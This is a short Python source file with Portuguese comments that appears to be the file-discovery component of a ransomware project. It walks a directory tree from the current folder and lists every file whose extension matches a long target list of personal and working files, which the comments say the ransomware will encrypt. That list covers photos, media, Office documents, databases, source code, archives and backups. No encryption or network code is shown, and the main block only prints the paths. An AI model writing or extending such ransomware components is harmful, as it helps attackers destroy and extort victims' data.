# Gustavo Simon

import os

# Método para descobrir um arquivo no sistema operacional


def discover(initial_path):
    # Extensões dos arquivos que serão encriptados pelo ransomware
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  #  Arquivos do Sitema
        "jpg", "jpeg", "bmp", "gif", "png", "svg", "psd", "raw",  # imagens
        "mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape",  # Audios
        "avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp",  # Vídeos
        "doc", "docx", "xls", "xlsx", "ppt", "pptx",  # Microsoft office
        # OpenOffice, Adobe, Latex, Markdown, etc
        "odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md",
        "yml", "yaml", "json", "xml", "csv",  # dados estruturados e config
        "db", "sql", "dbf", "mdb", "iso",  # bancos de dados e imagens de disco
        "html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css",  # tecnologias web
        "c", "cpp", "cxx", "h", "hpp", "hxx",  # Código fonte C e C++
        "java", "class", "jar",  # Códigos fonte Java
        "ps", "bat", "vb",  # Scripts de sistemas windows
        "awk", "sh", "cgi", "pl", "ada", "swift",  # Scripts de sistemas unix
        "go", "py", "pyc", "bf", "coffee",  # Outros tipos de códigos fonte
        "zip", "tar", "tgz", "bz2", "7z", "rar", "bak"  # Arquivos compactados e Backups
    ]

# Retorna lista com o diretório atual, pastas e arquivos a partir de um diretório inicial
    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            # Busca o diretório absoluto do arquivo retornado
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            # Busca a extensão do arquivo para verificar se o arquivo encontrado está na lista de arquivos que devem ser encriptados
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


if __name__ == '__main__':
    x = discover(os.getcwd())
    for i in x:
        print(i)
